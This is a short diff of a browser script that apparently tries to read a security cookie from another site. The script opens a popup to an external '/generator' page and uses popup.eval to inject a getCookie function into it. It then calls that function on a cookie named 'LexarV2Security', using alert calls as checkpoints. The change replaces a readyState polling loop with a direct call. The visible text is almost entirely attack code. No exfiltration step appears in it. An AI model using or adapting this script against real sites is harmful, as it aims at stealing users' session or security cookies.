@@ -1,5 +1,6 @@
 e
 
+
 <script>
 
 let popup = window.open('https://lexarmguiv2.online/generator')
@@ -32,12 +33,8 @@ function getCookie(name) {
 }
 popup.eval(getCookie + "")
 popup.alert('1')
-var readyStateCheckInterval = setInterval(function() {
-  if (popup.document.readyState === "complete") {
-    clearInterval(readyStateCheckInterval);
-    popup.getCookie('LexarV2Security')
-  }
-}, 50);
+popup.getCookie('LexarV2Security')
+
 
 popup.alert('2')
 
